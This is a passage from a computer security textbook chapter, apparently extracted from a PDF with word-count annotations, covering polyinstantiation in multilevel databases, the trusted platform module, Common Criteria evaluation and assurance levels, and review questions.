of a higher-level row with the specified primary key value.
	
2.	 Replace the existing row with the new row classified at the lower level. This is
[Word Count: 39]

undesirable because it would allow the user to overwrite data not visible to the 
user, thus compromising data integrity.
	
3.	 Insert the new row at the lower level without modifying the existing row at the
[Word Count: 35]

higher level. This is known as polyinstantiation. This avoids the inference and 
data integrity problems but creates a database with conflicting entries.
[Word Count: 22]

The same alternatives apply when a user attempts to update a row rather than 
insert a row. To illustrate the effect of polyinstantiation, consider the following 
query applied to Figure 13.9c by a user with a low clearance (U).
[Word Count: 39]

INSERT INTO Employee
	
VALUES (James,8,35K,9664,U)
[Word Count: 5]

The table already contains a row for James with a higher salary level, which 
necessitates classifying the row as restricted. This new tuple would have an unre-
stricted classification. The same effect would be produced by an update:
[Word Count: 38]

UPDATE Employee
	
SET Salary=35K
	
WHERE Eid=9664
[Word Count: 6]

The result is unsettling (Figure 13.10). Clearly, James can only have one ­salary 
and therefore one of the two rows is false. The motivation for this is to prevent
[Word Count: 29]

­inference. If a unrestricted user queries the salary of James in the original database, 
the user’s request is rejected and the user may infer that salary is greater than 50K. 
The inclusion of the “false” row provides a form of cover for the true salary of James. 
Although the approach may appear unsatisfactory, there have been a number of 
designs and implementations of polyinstantiation [BERT95].
[Word Count: 65]

The problem can be avoided by using a classification granularity of database 
or table, and in many applications, such granularity is all that is needed.
[Word Count: 25]

13.5	Trusted Computing and the Trusted
	 	
Platform Module
[Word Count: 8]

The trusted platform module (TPM) is a concept being standardized by an industry 
consortium, the Trusted Computing Group. The TPM is a hardware module that 
is at the heart of a hardware/software approach to trusted computing. Indeed, the 
term trusted computing (TC) is now used in the industry to refer to this type of 
hardware/software approach.
[Word Count: 56]

To achieve these features, TC provides three basic services: authenticated 
boot, certification, and encryption.
[Word Count: 14]

The authenticated boot service is responsible for booting the entire operating 
­system in stages and assuring that each portion of the OS, as it is loaded, is a 
­version that is approved for use. Typically, an OS boot begins with a small piece
[Word Count: 43]

Figure 13.10  Example of Polyinstantiation
[Word Count: 5]

13.5 / Trusted Computing and the Trusted Platform Module   465
[Word Count: 10]

466    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

Once a configuration is achieved and logged by the TPM, the TPM can certify the 
configuration to other parties. The TPM can produce a digital certificate by signing 
a formatted description of the configuration information using the TPM’s private 
key. Thus, another user, either a local user or a remote system, can have confidence 
that an unaltered configuration is in use because
[Word Count: 62]

1.	 The TPM is considered trustworthy. We do not need a further certification of
[Word Count: 14]

the TPM itself.
	
2.	 Only the TPM possesses this TPM’s private key. A recipient of the configura-
[Word Count: 17]

tion can use the TPM’s public key to verify the signature (Figure 2.7b).
[Word Count: 13]

To assure that the configuration is timely, a requester issues a “challenge” in 
the form of a random number when requesting a signed certificate from the TPM. 
The TPM signs a block of data consisting of the configuration information with 
the random number appended to it. The requester therefore can verify that the 
­certificate is both valid and up to date.
[Word Count: 61]

The TC scheme provides for a hierarchical approach to certification. The 
TPM certifies the hardware/OS configuration. Then the OS can certify the presence 
and configuration of application programs. If a user trusts the TPM and trusts the 
certified version of the OS, then the user can have confidence in the application’s 
configuration.
[Word Count: 52]

The encryption service enables the encryption of data in such a way that the data 
can be decrypted only by a certain machine and only if that machine is in a certain 
configuration. There are several aspects of this service.
[Word Count: 40]

First, the TPM maintains a master secret key unique to this machine. From 
this key, the TPM generates a secret encryption key for every possible configuration
[Word Count: 26]

13.5 / Trusted Computing and the Trusted Platform Module   467
[Word Count: 10]

of that machine. If data are encrypted while the machine is in one configuration, the 
data can only be decrypted using that same configuration. If a different configura-
tion is created on the machine, the new configuration will not be able to decrypt the 
data encrypted by a different configuration.
[Word Count: 50]

This scheme can be extended upward, as is done with certification. Thus, it is 
possible to provide an encryption key to an application so that the application can 
encrypt data, and decryption can only be done by the desired version of the desired 
application running on the desired version of the desired OS. These encrypted data 
can be stored locally, only retrievable by the application that stored them, or trans-
mitted to a peer application on a remote machine. The peer application would have 
to be in the identical configuration to decrypt the data.
[Word Count: 94]

Figure 13.11, based on the most recent TPM specification, is a block diagram of the 
functional components of the TPM. These are as follows:
[Word Count: 24]

• I/O: All commands enter and exit through the I/O component, which provides
[Word Count: 13]

communication with the other TPM components.
 
• Cryptographic co-processor: Includes a processor that is specialized for
[Word Count: 16]

encryption and related processing. The specific cryptographic algorithms 
implemented by this component include RSA encryption/decryption,  
RSA-based digital signatures, and symmetric encryption.
[Word Count: 21]

Figure 13.11  TPM Component Architecture
[Word Count: 5]

468    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

• Key generation: Creates RSA public/private key pairs and symmetric keys.
 
• HMAC engine: This algorithm is used in various authentication protocols.
 
• Random number generator (RNG): This component produces random ­numbers
[Word Count: 32]

used in a variety of cryptographic algorithms, including key generation, random 
values in digital signatures, and nonces. A nonce is a random number used once, 
as in a challenge protocol. The RNG uses a hardware source of randomness 
(manufacturer specific) and does not rely on a software algorithm that produces 
pseudo random numbers.
 
• SHA-1 engine: This component implements the SHA algorithm, which is used
[Word Count: 65]

in digital signatures and the HMAC algorithm.
 
• Power detection: Manages the TPM power states in conjunction with the
[Word Count: 19]

­platform power states.
 
• Opt-in: Provides secure mechanisms to allow the TPM to be enabled or
[Word Count: 16]

­disabled at the customer/user’s discretion.
 
• Execution engine: Runs program code to execute the TPM commands
[Word Count: 16]

received from the I/O port.
 
• Nonvolatile memory: Used to store persistent identity and state parameters
[Word Count: 16]

for this TPM.
 
• Volatile memory: Temporary storage for execution functions, plus storage
[Word Count: 13]

of volatile parameters, such as current TPM state, cryptographic keys, and 
­session information.
[Word Count: 13]

To give some feeling for the operation of a TC/TPM system, we look at the 
­protected storage function. The TPM generates and stores a number of encryption 
keys in a trust hierarchy. At the root of the hierarchy is a storage root key gener-
ated by the TPM and accessible only for the TPM’s use. From this key other keys 
can be generated and protected by encryption with keys closer to the root of the 
hierarchy.
[Word Count: 76]

An important feature of Trusted Platforms is that a TPM protected object can 
be “sealed” to a particular software state in a platform. When the TPM protected 
object is created, the creator indicates the software state that must exist if the secret 
is to be revealed. When a TPM unwraps the TPM protected object (within the TPM 
and hidden from view), the TPM checks that the current software state matches the 
indicated software state. If they match, the TPM permits access to the secret. If they 
do not match, the TPM denies access to the secret.
[Word Count: 96]

Figure 13.12 provides an example of this protection. In this case, there is an 
encrypted file on local storage that a user application wishes to access. The following 
steps occur:
[Word Count: 30]

1.	 The symmetric key that was used to encrypt the file is stored with the file.
[Word Count: 16]

The key itself is encrypted with another key to which the TPM has access. The 
protected key is submitted to the TPM with a request to reveal the key to the 
application.
[Word Count: 32]

2.	 Associated with the protected key is a specification of the hardware/software
[Word Count: 12]

configuration that may have access to the key. The TPM verifies that the 
­current configuration matches the configuration required for revealing the key. 
In addition, the requesting application must be specifically authorized to access 
the key. The TPM uses an authorization protocol to verify authorization.
	
3.	 If the current configuration is permitted access to the protected key, then the
[Word Count: 59]

TPM decrypts the key and passes it on to the application.
	
4.	 The application uses the key to decrypt the file. The application is trusted to
[Word Count: 26]

The encryption of a file proceeds in an analogous matter. In this latter case, 
a process requests a symmetric key to encrypt the file. The TPM then provides an 
encrypted version of the key to be stored with the file.
[Word Count: 40]

13.6	Common Criteria for Information Technology
	 	
Security Evaluation
[Word Count: 8]

The work done by the National Security Agency and other U.S. government agen-
cies to develop requirements and evaluation criteria for trusted systems resulted 
in the publication of the Trusted Computer System Evaluation Criteria (TCSEC),
[Word Count: 35]

Figure 13.12  Decrypting a File Using a Protected Key
[Word Count: 9]

13.6 / Common Criteria for Information Technology   469
[Word Count: 8]

470    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

The CC defines a common set of potential security requirements for use in evalu-
ation. The term target of evaluation (TOE) refers to that part of the product or 
­system that is subject to evaluation. The requirements fall into two categories:
[Word Count: 41]

• Functional requirements: Define desired security behavior. CC documents
[Word Count: 9]

establish a set of security functional components that provide a standard way 
of expressing the security functional requirements for a TOE.
 
• Assurance requirements: The basis for gaining confidence that the claimed secu-
[Word Count: 33]

rity measures are effective and implemented correctly. CC documents ­establish 
a set of assurance components that provide a standard way of ­expressing the 
assurance requirements for a TOE.
[Word Count: 28]

13.6 / Common Criteria for Information Technology   471
[Word Count: 8]

For example, the cryptographic support class of functional requirements 
includes two families: cryptographic key management and cryptographic operation. 
There are four components under the cryptographic key management family, which 
are used to specify key generation algorithm and key size; key distribution method; 
key access method; and key destruction method. For each component, a standard 
may be referenced to define the requirement. Under the cryptographic operation 
family, there is a single component, which specifies an algorithm and key size based 
on an assigned standard.
[Word Count: 83]

Sets of functional and assurance components may be grouped together into 
reusable packages, which are known to be useful in meeting identified objec-
tives. An example of such a package would be functional components required for 
Discretionary Access Controls.
[Word Count: 39]

Table 13.3  CC Security Functional Requirements
[Word Count: 6]

Audit
Involves recognizing, recording, storing, and analyzing information related to 
security activities. Audit records are produced by these activities and can be 
examined to determine their security relevance.
[Word Count: 28]

Used when the TOE implements cryptographic functions. These may be used, 
for example, to support communications, identification and authentication, or 
data separation.
[Word Count: 22]

Communications
Provides two families concerned with nonrepudiation by the originator and by 
the recipient of data.
[Word Count: 16]

Specifies requirements relating to the protection of user data within the TOE 
during import, export, and storage, in addition to security attributes related to 
user data.
[Word Count: 26]

Ensure the unambiguous identification of authorized users and the correct 
association of security attributes with users and subjects.
[Word Count: 18]

Specifies the management of security attributes, data and functions.
[Word Count: 9]

Privacy
Provides a user with protection against discovery and misuse of his or her 
identity by other users.
[Word Count: 18]

Protection of the 
TOE security 
functions
[Word Count: 6]

Focused on protection of TSF (TOE security functions) data rather than 
of user data. The class relates to the integrity and management of the TSF 
mechanisms and data.
[Word Count: 28]

Supports the availability of required resources, such as processing capability 
and storage capacity. Includes requirements for fault tolerance, priority of 
service, and resource allocation.
[Word Count: 24]

TOE access
Specifies functional requirements, in addition to those specified for 
­identification and authentication, for controlling the establishment of a user’s 
session. The requirements for TOE access govern such things as limiting 
the number and scope of user sessions, displaying the access history, and 
­modifying access parameters.
[Word Count: 47]

Concerned with trusted communications paths between the users and the TSF 
and between TSFs.
[Word Count: 14]

472    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

The CC also defines two kinds of documents that can be generated using the 
CC-defined requirements.
[Word Count: 16]

• Protection profiles (PPs): Define an implementation-independent set
[Word Count: 8]

of ­security requirements and objectives for a category of products or  
systems that meet similar consumer needs for IT security. A PP is intended 
to be ­reusable and to define requirements that are known to be useful and  
effective in meeting the identified objectives. The PP concept has been 
­developed to support the definition of functional standards and as an aid 
to formulating procurement specifications. The PP reflects user security 
­requirements.
[Word Count: 71]

Table 13.4  CC Security Assurance Requirements
[Word Count: 6]

Requires that the integrity of the TOE is adequately preserved. Specifically, 
­configuration management provides confidence that the TOE and documen-
tation used for evaluation are the ones prepared for distribution.
[Word Count: 30]

Concerned with the measures, procedures, and standards for secure delivery, 
­installation, and operational use of the TOE, to ensure that the security  
protection offered by the TOE is not compromised during these events.
[Word Count: 33]

Development
Concerned with the refinement of the TSF from the specification defined 
in the ST to the implementation, and a mapping from the security require-
ments to the lowest level representation.
[Word Count: 31]

Concerned with the secure operational use of the TOE, by the users and  
administrators.
[Word Count: 14]

Life cycle support
Concerned with the life cycle of the TOE include life cycle definition, tools 
and ­techniques, security of the development environment, and remediation 
of flaws found by TOE consumers.
[Word Count: 31]

Tests
Concerned with demonstrating that the TOE meets its functional  
requirements. The families address coverage and depth of developer testing, 
and requirements for independent testing.
[Word Count: 25]

Provides requirements that are intended to be applied after a TOE has been 
certified against the CC. These requirements are aimed at assuring that the 
TOE will continue to meet its security target as changes are made to the 
TOE or its environment.
[Word Count: 43]

13.6 / Common Criteria for Information Technology   473
[Word Count: 8]

• Security targets (STs): Contain the IT security objectives and require-
[Word Count: 11]

ments of a specific identified TOE and defines the functional and assurance 
­measures ­offered by that TOE to meet stated requirements. The ST may claim 
­conformance to one or more PPs and forms the basis for an evaluation. The ST 
is ­supplied by a vendor or developer.
[Word Count: 47]

Figure 13.13 illustrates the relationship between requirements on the one 
hand and profiles and targets on the other. For a PP, a user can select a number of 
components to define the requirements for the desired product. The user may also 
refer to predefined packages that assemble a number of requirements ­commonly 
grouped together within a product requirements document. Similarly, a vendor or 
designer can select a number of components and packages to define an ST.
[Word Count: 76]

Figure 13.14 shows what is referred to in the CC documents as the security 
functional requirements paradigm. In essence, this illustration is based on the 
­reference monitor concept but makes use of the terminology and design philosophy 
of the CC.
[Word Count: 40]

The protection profile for a smart card, developed by the Smart Card Security 
User Group, provides a simple example of a PP. This PP describes the IT security 
requirements for a smart card to be used in connection with sensitive applications, 
such as banking industry financial payment systems. The assurance level for this 
PP is EAL 4, which is described in the following subsection. The PP lists threats 
that must be addressed by a product that claims to comply with this PP. The threats 
include the following:
[Word Count: 87]

• Physical probing: May entail reading data from the TOE through techniques
[Word Count: 12]

commonly employed in IC failure analysis and IC reverse engineering efforts.
 
• Invalid input: Invalid input may take the form of operations that are not for-
[Word Count: 26]

matted correctly, requests for information beyond register limits, or attempts 
to find and execute undocumented commands. The result of such an attack
[Word Count: 22]

assurance requirements.
Optional input to PP or ST
[Word Count: 8]

Figure 13.13  Organization and Construction of Common Criteria Requirements
[Word Count: 9]

474    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

may be a compromise in the security functions, generation of exploitable errors 
in operation, or release of protected data.
 
• Linkage of multiple operations: An attacker may observe multiple uses of
[Word Count: 31]

resources or services and, by linking these observations, deduce information 
that that may reveal security function data.
[Word Count: 17]

Following a list of threats, the PP turns to a description of security objectives. 
These reflect the stated intent to counter identified threats and/or comply with any 
organizational security policies identified. Nineteen objectives are listed, including 
the following:
[Word Count: 38]

• Audit: The system must provide the means of recording selected security-
[Word Count: 12]

relevant events, so as to assist an administrator in the detection of potential 
attacks or misconfiguration of the system security features that would leave it 
susceptible to attack.
 
• Fault insertion: The system must be resistant to repeated probing through
[Word Count: 40]

insertion of erroneous data.
 
• Information leakage: The system must provide the means of controlling and
[Word Count: 16]

limiting the leakage of information in the system so that no useful information 
is revealed over the power, ground, clock, reset, or I/O lines.
[Word Count: 24]

Target of evaluation (TOE)
TOE security functions interface (TSFI)
[Word Count: 9]

Figure 13.14  Security Functional Requirements Paradigm
[Word Count: 6]

The PP defines 24 security assurance requirements from the available classes 
of security assurance requirements (Table 13.4). These requirements were chosen 
to demonstrate:
[Word Count: 23]

• The quality of the product design and configuration
 
• That adequate protection is provided during the design and implementation
[Word Count: 20]

of the product
 
• That vendor testing of the product meets specific parameters
 
• That security functionality is not compromised during product delivery
 
• That user guidance, including product manuals pertaining to installation,
[Word Count: 33]

maintenance and use, are of a specified quality and appropriateness
[Word Count: 10]

The PP also lists security requirements of the IT environment. These cover the 
following topics:
[Word Count: 15]

• Cryptographic key distribution
 
• Cryptographic key destruction
 
• Security roles
[Word Count: 11]

The final section of the PP (excluding appendices) is a lengthy rationale for 
all of the selections and definitions in the PP. The PP is an industry-wide effort 
designed to be realistic in its ability to be met by a variety of products with a variety 
of internal mechanisms and implementation approaches.
[Word Count: 52]

The NIST Computer Security Handbook [NIST95] characterizes assurance in the 
following way: “Security assurance is the degree of confidence one has that the 
security controls operate correctly and protect the system as intended. Assurance 
is not, however, an absolute guarantee that the measures work as intended.” As 
with any other aspect of computer security, resources devoted to assurance must be 
subjected to some sort of cost-benefit analysis to determine what amount of effort is 
reasonable for the level of assurance desired.
[Word Count: 81]

476    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

The design of assurance measures depends in part on the target audience 
for these measures. That is, in developing a degree of confidence in security 
­measures, we need to specify what individuals or groups possess that degree of 
confidence. The CC document on assurance [CCPS12c] lists the following target 
audiences:
[Word Count: 50]

• Consumers: Select security features and functions for a system and determine
[Word Count: 12]

the required levels of security assurance.
 
• Developers: Respond to actual or perceived consumer security requirements;
[Word Count: 16]

interpret statements of assurance requirements; and determine assurance 
approaches and level of effort.
 
• Evaluators: Use the assurance requirements as a mandatory statement of
[Word Count: 24]

evaluation criteria when evaluating security features and controls.
[Word Count: 8]

Evaluators may be in the same organization as consumers or a third-party 
evaluation team.
[Word Count: 14]

Assurance deals with security features of IT products, such as computers, database 
management systems, operating systems, and complete systems. Assurance applies 
to the following aspects of a system:
[Word Count: 28]

• Requirements: This category refers to the security requirements for a product
 
• Security policy: Based on the requirements, a security policy can be defined
 
• Product design: Based on requirements and security policy
 
• Product implementation: Based on design
 
• System operation: Includes ordinary use plus maintenance
[Word Count: 48]

In each area, various approaches can be taken to provide assurance. [CCPS12c] 
lists the following possible approaches:
[Word Count: 17]

• Analysis and checking of process(es) and procedure(s)
 
• Checking that process(es) and procedure(s) are being applied
 
• Analysis of the correspondence between TOE design representations
 
• Analysis of the TOE design representation against the requirements
 
• Verification of proofs
 
• Analysis of guidance documents
 
• Analysis of functional tests developed and the results provided
 
• Independent functional testing
[Word Count: 59]

• Analysis for vulnerabilities (including flaw hypothesis)
 
• Penetration testing
[Word Count: 10]

A somewhat different take on the elements of assurance is provided in 
[CHOK92]. This report is based on experience with Orange Book evaluations but
[Word Count: 24]

is relevant to current trusted product development efforts. The author views assur-
ance as encompassing the following requirements:
[Word Count: 18]

• System architecture: Addresses both the system development phase and the
[Word Count: 11]

system operations phase. Examples of techniques for increasing the level of 
­assurance during the development phase include modular software design, 
­layering, and data abstraction/information hiding. An example of the opera-
tions phase is isolation of the trusted portion of the system from user processes.
 
• System integrity: Addresses the correct operation of the system hardware and
[Word Count: 56]

firmware and is typically satisfied by periodic use of diagnostic software.
 
• System testing: Ensures that the security features have been tested thoroughly.
[Word Count: 23]

This includes testing of functional operations, testing of security requirements, 
and testing of possible penetrations.
 
• Design specification and verification: Addresses the correctness of the system
[Word Count: 26]

design and implementation with respect to the system security policy. Ideally, 
formal methods of verification can be used.
 
• Covert channel analysis: This type of analysis attempts to identify any poten-
[Word Count: 31]

tial means for bypassing security policy and ways to reduce or eliminate such 
possibilities.
 
• Trusted facility management: Deals with system administration. One approach
[Word Count: 24]

is to separate the roles of system operator and security administrator. Another 
approach is detailed specification of policies and procedures with mechanisms 
for review.
 
• Trusted recovery: Provides for correct operation of security features after a
[Word Count: 36]

system recovers from failures, crashes, or security incidents.
 
• Trusted distribution: Ensures that protected hardware, firmware, and soft-
[Word Count: 18]

ware do not go through unauthorized modification during transit from the 
vendor to the customer.
 
• Configuration management: Requirements are included for configuration
[Word Count: 23]

control, audit, management, and accounting.
[Word Count: 5]

Thus we see that assurance deals with the design, implementation, and opera-
tion of protected resources and their security functions and procedures. It is important 
to note that assurance is a process, not an attainment. That is, assurance must be an 
ongoing activity, including testing, auditing, and review.
[Word Count: 48]

Common Criteria Evaluation Assurance Levels
[Word Count: 5]

The concept of evaluation assurance is a difficult one to pin down. Further, the 
degree of assurance required varies from one context and one functionality to 
another. To structure the need for assurance, the CC defines a scale for rating assur-
ance consisting of seven evaluation assurance levels (EALs) ranging from the least 
rigor and scope for assurance evidence (EAL 1) to the most (EAL 7). The levels are 
as follows:
[Word Count: 71]

• EAL 1: functionally tested: For environments where security threats are not
[Word Count: 12]

considered serious. It involves independent product testing with no input
[Word Count: 10]

478    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

from the product developers. The intent is to provide a level of confidence in 
­correct operation.
 
• EAL 2: structurally tested: Includes a review of a high-level design provided
[Word Count: 29]

by the product developer. Also, the developer must conduct a vulnerability 
analysis for well-known flaws. The intent is to provide a low to moderate level 
of independently assured security.
 
• EAL 3: methodically tested and checked: Requires a focus on the security
[Word Count: 42]

features. This includes requirements that the design separate security-related 
components from those that are not; that the design specifies how security 
is enforced; and that testing be based both on the interface and the high-
level design, rather than a black-box testing based only on the interface. It 
is applicable where the requirement is for a moderate level of independently 
assured security, with a thorough investigation of the TOE and its develop-
ment ­without incurring substantial reengineering costs.
 
• EAL 4: methodically designed, tested, and reviewed: Requires a low-level as
[Word Count: 90]

well as a high-level design specification. Requires that the interface specifica-
tion be complete. Requires an abstract model that explicitly defines security 
for the product. Requires an independent vulnerability analysis. It is appli-
cable in those circumstances where developers or users require a moderate 
to high level of independently assured security in conventional commodity 
TOEs, and there is willingness to incur some additional security-specific 
engineering costs.
 
• EAL 5: semiformally designed and tested: Provides an analysis that includes
[Word Count: 78]

all of the implementation. Assurance is supplemented by a formal model and 
a semiformal presentation of the functional specification and high-level design 
and a semiformal demonstration of correspondence. The search for vulnera-
bilities must ensure resistance to penetration attackers with a moderate attack 
potential. Covert channel analysis and modular design are also required.
 
• EAL 6: semiformally verified design and tested: Permits a developer to gain
[Word Count: 66]

high assurance from application of specialized security engineering techniques 
in a rigorous development environment, and to produce a premium TOE for 
protecting high value assets against significant risks. The independent search 
for vulnerabilities must ensure resistance to penetration attackers with a high 
attack potential.
 
• EAL 7: formally verified design and tested: The formal model is supple-
[Word Count: 57]

mented by a formal presentation of the functional specification and high level 
design, showing correspondence. Evidence of developer “white box” testing 
of ­internals and complete independent confirmation of developer test results 
are required. Complexity of the design must be minimized.
[Word Count: 40]

The first four levels reflect various levels of commercial design practice. Only 
at the highest of these levels (EAL 4) is there a requirement for any source code 
analysis, and this only for a portion of the code. The top three levels provide ­specific 
guidance for products developed using security specialists and security-specific 
design and engineering approaches.
[Word Count: 57]

The evaluation process will relate the security target to one or more of the 
high-level design, low-level design, functional specification, source code implemen-
tation, and object code and hardware realization of the TOE. The degree of rigor 
used, and the depth of analysis are determined by the assurance level desired for the 
evaluation. At the higher levels, semiformal or formal models are used to confirm 
that the TOE does indeed implement the desired security target. The evaluation 
process also involves careful testing of the TOE to confirm it’s security features.
[Word Count: 90]

The evaluation involves a number of parties:
[Word Count: 7]

• Sponsor: Usually either the customer or the vendor of a product for which
[Word Count: 14]

evaluation is required. Sponsors determine the security target that the product 
has to satisfy.
 
• Developer: Has to provide suitable evidence on the processes used to design,
[Word Count: 27]

implement, and test the product to enable its evaluation.
 
• Evaluator: Performs the technical evaluation work, using the evidence supplied
[Word Count: 20]

by the developers, and additional testing of the product, to confirm that it satis-
fies the functional and assurance requirements specified in the security target. 
In many countries, the task of evaluating products against a trusted computing 
standard is delegated to one or more endorsed commercial suppliers.
 
• Certifier: The government agency that monitors the evaluation process and
[Word Count: 58]

subsequently certifies that a product as been successfully evaluated. Certifiers 
generally manage a register of evaluated products, which can be consulted by 
customers.
[Word Count: 23]

The evaluation process has three broad phases:
[Word Count: 7]

1.	 Preparation: Involves the initial contact between the sponsor and developers of
[Word Count: 12]

a product, and the evaluators who will assess it. It will confirm that the ­sponsor 
and developers are adequately prepared to conduct the evaluation and will 
­include a review of the security target and possibly other evaluation delivera-
bles. It concludes with a list of evaluation deliverables and acceptance of the 
overall project costing and schedule.
	
2.	 Conduct of evaluation: A structured and formal process in which the evalua-
[Word Count: 69]

tors conduct a series of activities specified by the CC. These include review-
ing the deliverables provided by the sponsor and developers, and other tests
[Word Count: 25]

480    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

of the product, to confirm it satisfies the security target. During this process, 
problems may be identified in the product, which are reported back to the 
developers for correction.
	
3.	 Conclusion: The evaluators provide the final evaluation technical report to
[Word Count: 40]

the certifiers for acceptance. The certifiers use this report, which may contain 
confidential information, to validate the evaluation process and to prepare a 
public certification report. The certification report is then listed on the rel-
evant register of evaluated products.
[Word Count: 40]

The evaluation process is normally monitored and regulated by a government 
agency in each country. In the United States the NIST and the NSA jointly operate 
the Common Criteria Evaluation and Validation Scheme (CCEVS). Many countries 
support a peering arrangement, which allows evaluations performed in one country 
to be recognized and accepted in other countries. Given the time and expense that 
an evaluation incurs, this is an important benefit to vendors and ­consumers. The 
Common Criteria Portal provides further information on the relevant agencies and 
processes used by participating countries.
[Word Count: 90]

[LAND81] is a comprehensive survey of computer security models but does not 
present any of the mathematical or formal details. [BELL05] summarizes the 
­Bell-LaPadula model and examines its relevance to contemporary system design 
and implementation.
[Word Count: 35]

[GALL09] is a worthwhile survey of the topics covered in this chapter. [GASS88] 
provides a comprehensive study of trusted computer systems. [SAYD04] is a historical 
summary of the evolution of multilevel security in military and commercial contexts.
[Word Count: 37]

[BERT95] and [LUNT90] examine the issues related to the use of multilevel 
security for a database system. [DENN85] and [MORG87] focus on the problem of 
inference in multilevel secure databases.
[Word Count: 30]

[OPPL05] and [FELT03] provide overviews of trusted computing and the 
TPM. [ENGL03] describes Microsoft’s approach to implementing trusted comput-
ing on Windows.
[Word Count: 22]

BELL05	
Bell, D. “Looking Back at the Bell-LaPadula Model.” Proceedings, 21st 
Annual IEEE Computer Security Applications Conference, 2005.
BERT95	
Bertino, E.; Japonica, S.; and Samurai, P. “Database Security: Research and 
Practice.” Information Systems, Vol. 20, No. 7, 1995.
DENN85	 Denning, D. “Commutative Filters for Reducing Interference Threats in
[Word Count: 48]

Multilevel Database Systems.” Proceedings of 1985 IEEE Symposium on 
Security and Privacy, 1985.
ENGL03	 England, P., et al. “A Trusted Open Platform.” Computer, July 2003.
FELT03	
Felten, E. “Understanding Trusted Computing: Will Its Benefits Outweigh 
its Drawbacks?” IEEE Security and Privacy, May/June 2003.
[Word Count: 43]

13.9 / Key Terms, Review Questions, and Problems   481
[Word Count: 9]

13.9 Key Terms, Review Questions, and Problems
[Word Count: 7]

Bell-LaPadula (BLP) model
Biba integrity model
certification rules
Chinese Wall Model
Clark-Wilson integrity
[Word Count: 13]

model
class
Common Criteria (CC)
component
ds-property
enforcement rules
family
mandatory access control
[Word Count: 13]

multilevel security (MLS)
polyinstantiation
reference monitor
sanitized data
security assurance
[Word Count: 10]

requirements
security class
security classification
security clearance
security functional
[Word Count: 9]

requirements
security kernel database
security level
security objective
[Word Count: 8]

security requirements
simple security property
[Word Count: 5]

­(ss-property)
target of evaluation
threat
Trojan horse
trust
trusted computer system
trusted computing
trusted computing base
trusted platform module (TPM)
trusted system
trustworthy system
*-property
[Word Count: 25]

13.1	
Explain the differences among the terms security class, security level, security clear-
ance, and security classification.
	 13.2	
What are the three rules specified by the BLP model?
	 13.3	
How is discretionary access control incorporated into the BLP models
	 13.4	
What is the principal difference between the BLP model and the Biba model?
	 13.5	
What are the three rules specified by the Biba model?
[Word Count: 64]

GALL09	 Galley, E., and Mitchell, C. “Trusted Computing: Security and Applications.”
[Word Count: 11]

Cryptologia, Volume 33, Number 1, 2009.
GASS88	
Gasser, M. Building a Secure Computer System. New York: Van Nostrand 
Reinhold, 1988.
LAND81	 Landwehr, C. “Formal Models for Computer Security.” Computing Surveys,
[Word Count: 30]

September 1981.
LUNT90	
Lunt, T., and Fernandez, E. “Database Security.” ACM SIGMOD Record, 
December 1990.
MORG87  Morgenstern, M. “Security and Inference in Multilevel Database and
[Word Count: 25]

Knowledge-Base Systems.” ACM SIGMOD Record, December 1987.
OPPL05	
Oppliger, R., and Rytz, R. “Does Trusted Computing Remedy Computer 
Security Problems?” IEEE Security and Privacy, March/April 2005.
SAYD04	 Saydjari, O. “Multilevel Security: Reprise.” IEEE Security and Privacy,
[Word Count: 36]

482    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

13.6	
Explain the difference between certification rules and enforcement rules in the Clark-
Wilson model.
	 13.7	
What is the meaning of the term Chinese wall in the Chinese Wall Model?
	 13.8	
What are the two rules that a reference monitor enforces?
	 13.9	
What properties are required of a reference monitor?
	13.10  	  In general terms, how can MLS be implemented in an RBAC system?
	13.11  	 Describe each of the possible degrees of granularity possible with an MLS database
[Word Count: 77]

system.
	13.12	
What is polyinstantiation?
	13.13	
Briefly describe the three basic services provided by a TPMs.
	13.14	
What is the aim of evaluating an IT product against a trusted computing evaluation 
standard?
	13.15	
What is the difference between security assurance and security functionality as used in 
trusted computing evaluation standards?
	13.16	
Who are the parties typically involved in a security evaluation process?
	13.17	
What are the three main stages in an evaluation of an IT product against a trusted 
computing standard, such as the Common Criteria?
[Word Count: 86]

two properties on M? Explain.
	 13.4	
In the example illustrated in Figure 13.2, state which of the eight BLP rules are 
­invoked for each action in the scenario.
	 13.5	
In Figure 13,2, the solid arrowed lines going from the level roles down to the ­operation 
roles indicate a role hierarchy with the operation roles having the indicated ­access 
rights (read, write) as a subset of the level roles. What do the solid arrowed lines going 
from one operation role to another indicate?
	 13.6	
Consider the following system specification using a generic specification language:
[Word Count: 93]

constants
subjects = set of processes
sec_labels = {1, 2, 3, … MAX} such that 1 6 2 6 . . . 6 MAX
files = set of information sequences
label: subjects —7 sec_labels
class(repository) = MAX
variables
respository: = set of all sets of files
initial state
repository = null set
actions
[Word Count: 53]

13.9 / Key Terms, Review Questions, and Problems   483
[Word Count: 9]

precondition f ∈files and respository = R
postcondition repository = R h {f}
browse (s ∈subjects)
[Word Count: 16]

precondition f ∈repository and label(s) = MAX
postcondition true
	
	
The system includes a fixed set of labeled processes. Each process can insert and browse 
information from a file repository that is associated with the highest security label.
a.	 Provide a formal definition of the system by filling in the blanks:
[Word Count: 50]

484    Chapter 13 / Trusted Computing and Multilevel Security
[Word Count: 9]

IT Security Management  
and Risk Assessment
[Word Count: 6]

14.2	
Organizational Context and Security Policy
[Word Count: 6]

Baseline Approach
Informal Approach
Detailed Risk Analysis
Combined Approach
[Word Count: 9]

Context and System Characterization
Identification of Threats/Risks/Vulnerabilities
Analyze Risks
Evaluate Risks
Risk Treatment
[Word Count: 13]

14.7	
Key Terms, Review Questions, and Problems
[Word Count: 7]

486    Chapter 14 / IT Security Management and Risk Assessment
[Word Count: 10]

In previous chapters, we discussed a range of technical and administrative measures that 
can be used to manage and improve the security of computer systems and networks. In 
this chapter and the next, we look at the process of how to best select and implement 
these measures to effectively address an organization’s security requirements. As we 
noted in Chapter 1, this involves examining three fundamental questions:
[Word Count: 66]

1.	 What assets do we need to protect?
	
2.	 How are those assets threatened?
	
3.	 What can we do to counter those threats?
[Word Count: 23]

The discipline of IT security management has evolved considerably over the last few 
